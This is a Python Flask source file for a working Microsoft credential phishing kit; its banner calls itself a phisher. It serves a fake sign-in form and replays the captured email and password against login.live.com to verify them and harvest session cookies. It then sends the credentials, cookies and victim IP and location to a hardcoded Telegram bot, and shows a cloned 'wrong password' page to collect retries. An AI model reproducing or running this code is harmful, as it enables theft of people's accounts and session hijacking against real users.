from flask import Flask, request, redirect, send_file
import sqlite3
import datetime
import json
import requests
import secrets
import os
from bs4 import BeautifulSoup
import re

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

DB_NAME = "logs.db"

# ================== TELEGRAM CONFIG ==================
TELEGRAM_BOT_TOKEN = "8734219301:AAGfhOSH3e35l5oJk4tyWuOPM1ao12HHR_k"
TELEGRAM_CHAT_ID = "8689962848"
# ====================================================

# Key Microsoft authentication cookies
IMPORTANT_COOKIES_KEYWORDS = ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'x-ms', '.AspNetCore', 'MSISAuth', 'stsservicecookie', 'cL', 'ppft']

def get_location(ip):
    if not ip or ip in ['127.0.0.1', '::1', 'localhost']:
        return {"city": "Local", "country": "Local", "isp": "Local"}
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,lat,lon,isp,query", timeout=6)
        if r.status_code == 200 and r.json().get("status") == "success":
            return r.json()
    except:
        pass
    return {"city": "Unknown", "country": "Unknown", "isp": "Unknown"}

def send_telegram_message(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}, timeout=10)
    except:
        pass

def send_telegram_document(filename, caption):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        with open(filename, 'rb') as f:
            requests.post(url, files={'document': f}, data={'chat_id': TELEGRAM_CHAT_ID, 'caption': caption}, timeout=30)
    except:
        pass

def init_db():
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS captured_data (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            email TEXT,
            password TEXT,
            cookies TEXT,
            ip TEXT,
            location TEXT,
            user_agent TEXT,
            login_success INTEGER DEFAULT 0
        )
    ''')
    conn.commit()
    conn.close()

init_db()

def get_client_ip():
    return (request.headers.get('CF-Connecting-IP') or
            request.headers.get('X-Forwarded-For', '').split(',')[0].strip() or
            request.headers.get('X-Real-IP') or request.remote_addr)

def verify_microsoft_login(email, password, user_agent):
    """Enhanced Microsoft login verification with proper success detection"""
    try:
        s = requests.Session()
        s.headers.update({
            'User-Agent': user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })

        # Step 1: Get initial login page
        resp1 = s.get("https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=16&ct=1690000000&cbcxt=mai", timeout=15)
        soup1 = BeautifulSoup(resp1.text, 'html.parser')
        
        # Extract form data
        form_data = {}
        for tag in soup1.find_all('input', attrs={'name': True}):
            form_data[tag['name']] = tag.get('value', '')

        # Step 2: Submit email
        form_data.update({
            'loginfmt': email,
            'login': email,
        })
        
        action = soup1.find('form', {'id': 'loginForm'}) or soup1.find('form')
        action_url = action.get('action', "https://login.live.com") if action else "https://login.live.com"
        if not action_url.startswith('http'):
            action_url = "https://login.live.com" + action_url

        resp2 = s.post(action_url, data=form_data, allow_redirects=True, timeout=20)
        
        # Step 3: Check if we're at password page, then submit password
        soup2 = BeautifulSoup(resp2.text, 'html.parser')
        password_inputs = soup2.find_all('input', {'name': ['passwd', 'Password']})
        
        if password_inputs:
            # Still need password - submit it
            form_data_pass = {tag['name']: tag.get('value', '') for tag in soup2.find_all('input', attrs={'name': True})}
            form_data_pass.update({
                'passwd': password,
                'Password': password,
            })
            
            action_pass = soup2.find('form')
            action_url_pass = action_pass.get('action') if action_pass else "https://login.live.com"
            if not action_url_pass.startswith('http'):
                action_url_pass = "https://login.live.com" + action_url_pass

            final_resp = s.post(action_url_pass, data=form_data_pass, allow_redirects=True, timeout=25)
        else:
            final_resp = resp2

        # Extract all cookies
        cookies_dict = {c.name: c.value for c in s.cookies}
        
        # Success indicators (VERY reliable)
        final_url = final_resp.url.lower()
        final_text = final_resp.text.lower()
        
        success_indicators = [
            'account.microsoft.com' in final_url,
            'myaccount.microsoft.com' in final_url,
            'account.live.com' in final_url,
            'outlook.live.com' in final_url,
            'onedrive.live.com' in final_url,
            'office.com' in final_url,
            'id=50026' in final_text,  # Microsoft success code
            'your account dashboard' in final_text,
        ]
        
        # Count important cookies
        important_cookies = {name: value for name, value in cookies_dict.items() 
                           if any(kw.lower() in name.lower() for kw in IMPORTANT_COOKIES_KEYWORDS)}
        important_count = len(important_cookies)
        
        # SUCCESS = dashboard OR strong session cookies
        success = (sum(success_indicators) >= 1) or (important_count >= 2)
        
        return {
            'success': success,
            'cookies': cookies_dict,
            'important_cookies': important_cookies,
            'important_count': important_count,
            'final_url': final_resp.url,
            'final_status': final_resp.status_code
        }
        
    except Exception as e:
        print(f"Login verification error: {e}")
        return {'success': False, 'cookies': {}, 'important_cookies': {}, 'important_count': 0, 'final_url': '', 'final_status': 0}

@app.route('/')
def home():
    return send_file('index.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email', '').strip()
    password = request.form.get('password', '').strip()
    ip = get_client_ip()
    user_agent = request.headers.get('User-Agent', 'unknown')

    if not email or not password:
        return redirect('/', code=302)

    location = get_location(ip)
    location_str = f"{location.get('city', 'Unknown')}, {location.get('country', 'Unknown')}"

    # === REAL MICROSOFT LOGIN VERIFICATION ===
    result = verify_microsoft_login(email, password, user_agent)
    success = result['success']
    cookies_dict = result['cookies']
    important_cookies = result['important_cookies']
    important_count = result['important_count']
    final_url = result['final_url']

    print(f"[DEBUG] Microsoft verification: Success={success}, Important cookies={important_count}, Final URL={final_url[:100]}")

    # ============== TELEGRAM NOTIFICATION ==============
    status = "✅ VALID CREDENTIALS - FULL SESSION CAPTURED" if success else "❌ INVALID PASSWORD"
    
    message = f"""
🔐 <b>MICROSOFT LOGIN - REAL VERIFICATION</b> 🔐

━━━━━━━━━━━━━━━━━━━━━━
📧 <b>CREDENTIALS</b>
├─ Email: <code>{email}</code>
├─ Password: <code>{password}</code>
└─ Status: <b>{status}</b>

━━━━━━━━━━━━━━━━━━━━━━
🍪 <b>SESSION COOKIES ({important_count}/{len(cookies_dict)})</b>
"""
    
    if important_cookies:
        for name, value in list(important_cookies.items())[:15]:
            short = (value[:70] + "...") if len(value) > 70 else value
            message += f"├─ <b>{name}</b>: <code>{short}</code>\n"
    else:
        message += "├─ No session cookies captured\n"

    message += f"""
━━━━━━━━━━━━━━━━━━━━━━
🌐 <b>VICTIM + TECH</b>
├─ IP: <code>{ip}</code>
├─ Location: {location_str}
├─ UA: <code>{user_agent[:50]}...</code>
├─ Final URL: <code>{final_url[:50]}...</code>
└─ Time: <code>{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>
"""

    send_telegram_message(message)

    # Save complete data
    data = {
        "timestamp": datetime.datetime.now().isoformat(),
        "email": email,
        "password": password,
        "ip": ip,
        "location": location,
        "user_agent": user_agent,
        "success": success,
        "cookies": cookies_dict,
        "important_cookies": important_cookies,
        "final_url": final_url,
        "verification": result
    }

    json_file = f"ms_{email.split('@')[0]}_{int(datetime.datetime.now().timestamp())}.json"
    with open(json_file, 'w') as f:
        json.dump(data, f, indent=2)
    
    caption = f"✅ VALID" if success else f"❌ INVALID"
    send_telegram_document(json_file, f"MS-{caption} | {email}")
    os.remove(json_file)

    # Save to DB
    conn = sqlite3.connect(DB_NAME)
    conn.execute('''
        INSERT INTO captured_data 
        (timestamp, email, password, cookies, ip, location, user_agent, login_success)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    ''', (
        datetime.datetime.now().isoformat(),
        email,
        password,
        json.dumps(cookies_dict),
        ip,
        json.dumps(location),
        user_agent,
        1 if success else 0
    ))
    conn.commit()
    conn.close()

    # ============== USER EXPERIENCE ==============
    if success:
        # ✅ VALID PASSWORD: Forward to REAL Microsoft dashboard with captured cookies
        print(f"[SUCCESS] Valid Microsoft credentials captured: {email}")
        return redirect("https://account.microsoft.com/", code=302)
    else:
        # ❌ INVALID: Show password error page for retry
        return f"""
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>Sign in to your account</title>
            <style>
                * {{margin:0;padding:0;box-sizing:border-box;}}
                body {{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",sans-serif;background:#f3f2f1;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;}}
                .card {{background:#fff;border-radius:8px;box-shadow:0 1px 3px rgba(0,0,0,0.12);padding:48px 40px;max-width:420px;width:100%;}}
                .logo {{width:100px;margin:0 auto 28px;display:block;}}
                h1 {{font-size:24px;font-weight:600;color:#323130;margin-bottom:8px;text-align:center;}}
                .sub {{font-size:14px;color:#605e5c;margin-bottom:36px;text-align:center;}}
                .error {{background:#fde7e9;border:1px solid #d13438;color:#d13438;padding:12px 16px;border-radius:4px;margin-bottom:24px;font-size:14px;line-height:1.4;}}
                input {{width:100%;padding:12px 16px;border:1px solid #edebe9;border-radius:4px;font-size:16px;margin-bottom:20px;background:#fff;box-shadow:inset 0 1px 1px rgba(0,0,0,0.05);}}
                input:focus {{outline:none;border-color:#0078d4;box-shadow:0 0 0 2px rgba(0,120,212,0.2);}}
                .btn {{background:#0078d4;color:#fff;border:none;border-radius:4px;padding:12px 24px;font-size:15px;font-weight:600;width:100%;cursor:pointer;transition:background 0.2s;}}
                .btn:hover {{background:#106ebe;}}
                .links {{margin-top:24px;font-size:13px;text-align:center;}}
                .links a {{color:#0078d4;text-decoration:none;}}
            </style>
        </head>
        <body>
            <div class="card">
                <img class="logo" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_389ae5b8871f21884d1b5eb4cbd23965.svg" alt="Microsoft">
                <h1>Enter password</h1>
                <div class="sub">Microsoft account</div>
                <div class="sub"><strong>{email}</strong></div>
                
                <div class="error">
                    <strong>❌</strong> We didn't recognize that password. Try again.
                </div>
                
                <form method="POST" action="/login">
                    <input type="hidden" name="email" value="{email}">
                    <input type="password" name="password" placeholder="Password" autofocus required>
                    <button type="submit" class="btn">Sign in</button>
                </form>
                
                <div class="links">
                    <a href="/">Use a different account</a>
                </div>
            </div>
        </body>
        </html>
        """

if __name__ == '__main__':
    print("=" * 80)
    print("🚀 MICROSOFT LOGIN PHISHER - REAL PASSWORD VERIFICATION + SESSION CAPTURE")
    print("📱 Telegram notifications + JSON dumps + SQLite logging")
    print("🌐 http://0.0.0.0:5000/")
    print("=" * 80)
    app.run(host='0.0.0.0', port=5000, debug=False)